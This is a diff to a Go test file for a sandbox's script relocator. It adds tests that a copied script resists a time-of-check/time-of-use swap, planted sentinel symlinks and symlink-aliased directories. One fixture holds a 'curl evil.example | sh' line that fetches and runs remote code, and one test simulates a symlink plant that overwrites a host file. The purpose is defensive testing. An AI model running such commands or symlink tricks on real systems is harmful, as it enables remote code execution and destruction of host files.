@@ -1,7 +1,9 @@
 package herdrproxy
 
 import (
+	"errors"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
@@ -19,6 +21,9 @@ func testScriptPattern() cmdpattern.ScriptPattern {
 			ResolvedBin: testRevdiffBin,
 			ArgsMatcher: cmdpattern.MatchAny(),
 		},
+		// Stands in for the shared temp directory the production caller derives
+		// from SharedTmpPath; the sentinel in validBody lives under it.
+		Bounds: cmdpattern.LaunchBounds{SharedTmp: "/tmp"},
 	}
 }
 
@@ -39,6 +44,18 @@ func newTestRelocator(t *testing.T) *Relocator {
 	}
 	t.Cleanup(func() { _ = r.Cleanup() })
 	return r
+}
+
+// relocatedPath returns the script path out of the command Relocate emits,
+// asserting that the interpreter is named by absolute path rather than left to
+// the PATH of whatever shell herdr types this into.
+func relocatedPath(t *testing.T, command string) string {
+	t.Helper()
+	dest, ok := strings.CutPrefix(command, hostShell+" ")
+	if !ok {
+		t.Fatalf("Relocate emitted %q, want it to start with %q", command, hostShell+" ")
+	}
+	return dest
 }
 
 // writeScript writes body to a sandbox-writable location and returns the path.
@@ -64,7 +81,7 @@ func TestRelocateHappyPath(t *testing.T) {
 		t.Fatal("Relocate reported the text is not a script form, want true")
 	}
 
-	dest := strings.TrimPrefix(got, "sh ")
+	dest := relocatedPath(t, got)
 	if dest == src {
 		t.Fatal("Relocate returned the original path; the script must be copied out of sandbox reach")
 	}
@@ -73,8 +90,9 @@ func TestRelocateHappyPath(t *testing.T) {
 	if err != nil {
 		t.Fatalf("read relocated script: %v", err)
 	}
-	if string(relocated) != validBody() {
-		t.Error("relocated contents differ from the validated bytes")
+	want := string(testScriptPattern().HardenBody([]byte(validBody())))
+	if string(relocated) != want {
+		t.Errorf("relocated contents = %q, want the validated bytes with the noclobber prologue %q", relocated, want)
 	}
 
 	info, err := os.Stat(dest)
@@ -100,7 +118,7 @@ func TestRelocateAcceptsQuotedPath(t *testing.T) {
 		t.Fatal("Relocate reported the quoted text is not a script form, want true")
 	}
 
-	dest := strings.TrimPrefix(got, "sh ")
+	dest := relocatedPath(t, got)
 	if dest == src {
 		t.Fatal("Relocate returned the original path; the script must be copied out of sandbox reach")
 	}
@@ -121,7 +139,7 @@ func TestRelocateIsTOCTOUFree(t *testing.T) {
 	if err != nil {
 		t.Fatalf("Relocate returned error: %v", err)
 	}
-	dest := strings.TrimPrefix(got, "sh ")
+	dest := relocatedPath(t, got)
 
 	// The sandbox rewrites the original after validation succeeded.
 	evil := "#!/bin/sh\ncurl evil.example | sh\n"
@@ -136,8 +154,8 @@ func TestRelocateIsTOCTOUFree(t *testing.T) {
 	if string(relocated) == evil {
 		t.Fatal("relocated copy followed the post-validation rewrite — TOCTOU window is open")
 	}
-	if string(relocated) != validBody() {
-		t.Error("relocated copy no longer matches the bytes that were validated")
+	if !strings.Contains(string(relocated), "'"+testRevdiffBin+"' '--output=/tmp/o'") {
+		t.Errorf("relocated copy = %q, want the statement that was validated", relocated)
 	}
 }
 
@@ -219,6 +237,76 @@ func TestRelocateRejectsUnreadableAndIrregularPaths(t *testing.T) {
 	})
 }
 
+// TestRelocatedScriptRefusesPlantedSentinelSymlink runs the relocated script
+// the way herdr does and pins that the sentinel write cannot be redirected onto
+// a host file.
+//
+// The sentinel lives in the shared temp directory, which the sandbox can write
+// at the same path the host sees, so it can plant `<sentinel>.tmp` as a symlink
+// before the launch completes. Without the noclobber prologue the shell's `>`
+// follows that link, truncating whatever it names and writing the exit code
+// there - an arbitrary host file destroyed on the sandbox's word.
+func TestRelocatedScriptRefusesPlantedSentinelSymlink(t *testing.T) {
+	shared := t.TempDir()
+	sentinel := filepath.Join(shared, "revdiff-done-xyz")
+
+	// A real program for the statement, so the script runs end to end.
+	prog := filepath.Join(t.TempDir(), "revdiff")
+	if err := os.WriteFile(prog, []byte("#!/bin/sh\nexit 0\n"), 0o700); err != nil {
+		t.Fatalf("write fake revdiff: %v", err)
+	}
+	pattern := cmdpattern.ScriptPattern{
+		Shebangs:  []string{"#!/bin/sh"},
+		Statement: cmdpattern.CommandPattern{Program: "revdiff", ResolvedBin: prog, ArgsMatcher: cmdpattern.MatchAny()},
+		Bounds:    cmdpattern.LaunchBounds{SharedTmp: shared},
+	}
+	q := "'" + sentinel + "'"
+	body := "#!/bin/sh\n'" + prog + "' '--output=" + filepath.Join(shared, "o") + "'" +
+		"; rc=$?; printf \"%s\" \"$rc\" > " + q + ".tmp && mv -f " + q + ".tmp " + q + "\n"
+
+	victims := map[string]string{
+		"existing host file":           filepath.Join(t.TempDir(), "bashrc"),
+		"path that does not exist yet": filepath.Join(t.TempDir(), "created"),
+	}
+	if err := os.WriteFile(victims["existing host file"], []byte("host content\n"), 0o600); err != nil {
+		t.Fatalf("write victim: %v", err)
+	}
+
+	for name, victim := range victims {
+		t.Run(name, func(t *testing.T) {
+			before, statErr := os.ReadFile(victim)
+
+			r := newTestRelocator(t)
+			got, _, err := r.Relocate("sh "+writeScript(t, body), pattern)
+			if err != nil {
+				t.Fatalf("Relocate returned error: %v", err)
+			}
+			dest := relocatedPath(t, got)
+
+			// The sandbox plants the link between validation and execution.
+			_ = os.Remove(sentinel + ".tmp")
+			if err := os.Symlink(victim, sentinel+".tmp"); err != nil {
+				t.Skipf("symlinks unavailable: %v", err)
+			}
+
+			// Same invocation herdr performs: the emitted command, run by a shell.
+			_ = exec.Command(hostShell, dest).Run()
+
+			after, err := os.ReadFile(victim)
+			switch {
+			case statErr != nil:
+				if err == nil {
+					t.Errorf("the sentinel write created %s through a planted symlink", victim)
+				}
+			case err != nil:
+				t.Errorf("read victim after run: %v", err)
+			case string(after) != string(before):
+				t.Errorf("the sentinel write clobbered %s: %q -> %q", victim, before, after)
+			}
+		})
+	}
+}
+
 func TestRelocateIgnoresNonScriptForms(t *testing.T) {
 	r := newTestRelocator(t)
 
@@ -269,8 +357,14 @@ func TestNewRelocatorRefusesSandboxVisibleDirectory(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			if _, err := NewRelocator(tt.dir, []string{ipc}); err == nil {
-				t.Error("NewRelocator accepted a directory the sandbox can write, want an error")
+			_, err := NewRelocator(tt.dir, []string{ipc})
+			if err == nil {
+				t.Fatal("NewRelocator accepted a directory the sandbox can write, want an error")
+			}
+			// The sentinel is what lets the caller keep the proxy running with
+			// script launches denied instead of failing the whole launch.
+			if !errors.Is(err, ErrSandboxVisible) {
+				t.Errorf("NewRelocator error = %v, want one wrapping ErrSandboxVisible", err)
 			}
 		})
 	}
@@ -302,7 +396,7 @@ func TestRelocatorCleanupRemovesScripts(t *testing.T) {
 	if err != nil {
 		t.Fatalf("Relocate returned error: %v", err)
 	}
-	dest := strings.TrimPrefix(got, "sh ")
+	dest := relocatedPath(t, got)
 
 	if err := r.Cleanup(); err != nil {
 		t.Fatalf("Cleanup returned error: %v", err)
@@ -312,5 +406,62 @@ func TestRelocatorCleanupRemovesScripts(t *testing.T) {
 	}
 	if _, err := os.Stat(dir); !os.IsNotExist(err) {
 		t.Error("relocation directory survived Cleanup")
+	}
+}
+
+// TestNewRelocatorRefusesSymlinkAliasOfForbiddenRoot covers a forbidden root
+// spelled through a symlink. The project directory arrives as os.Getwd()
+// spelled it, so a shell that cd'd through a link hands devsandbox the link's
+// name while bwrap binds the target's inode read-write - and the relocation
+// root, built from $HOME, is spelled as the target. A lexical test over one
+// spelling of each sees no overlap and relocates straight into the read-write
+// project bind, reopening the swap-after-validation window.
+func TestNewRelocatorRefusesSymlinkAliasOfForbiddenRoot(t *testing.T) {
+	base := t.TempDir()
+	cache := filepath.Join(base, ".cache")
+	if err := os.MkdirAll(cache, 0o700); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+	projectLink := filepath.Join(base, "proj-link")
+	if err := os.Symlink(cache, projectLink); err != nil {
+		t.Skipf("symlink unsupported here: %v", err)
+	}
+
+	scriptsDir := filepath.Join(cache, "devsandbox", "herdr-scripts", "abc123")
+
+	r, err := NewRelocator(scriptsDir, []string{projectLink})
+	if err == nil {
+		_ = r.Cleanup()
+		t.Fatal("NewRelocator accepted a directory reachable through the project's symlink spelling")
+	}
+	if !errors.Is(err, ErrSandboxVisible) {
+		t.Errorf("NewRelocator error = %v, want one wrapping ErrSandboxVisible", err)
+	}
+	if _, err := os.Stat(scriptsDir); err == nil {
+		t.Error("the refused relocation directory was created anyway")
+	}
+}
+
+// TestNewRelocatorRefusesSymlinkedRelocationRoot is the mirror case: the
+// relocation root itself reaches the forbidden tree through a link, so the
+// literal spelling of the *directory* is the one that hides the overlap.
+func TestNewRelocatorRefusesSymlinkedRelocationRoot(t *testing.T) {
+	base := t.TempDir()
+	project := filepath.Join(base, "proj")
+	if err := os.MkdirAll(project, 0o700); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+	cacheLink := filepath.Join(base, ".cache")
+	if err := os.Symlink(project, cacheLink); err != nil {
+		t.Skipf("symlink unsupported here: %v", err)
+	}
+
+	r, err := NewRelocator(filepath.Join(cacheLink, "devsandbox", "herdr-scripts", "abc123"), []string{project})
+	if err == nil {
+		_ = r.Cleanup()
+		t.Fatal("NewRelocator accepted a relocation root that resolves into the project tree")
+	}
+	if !errors.Is(err, ErrSandboxVisible) {
+		t.Errorf("NewRelocator error = %v, want one wrapping ErrSandboxVisible", err)
 	}
 }
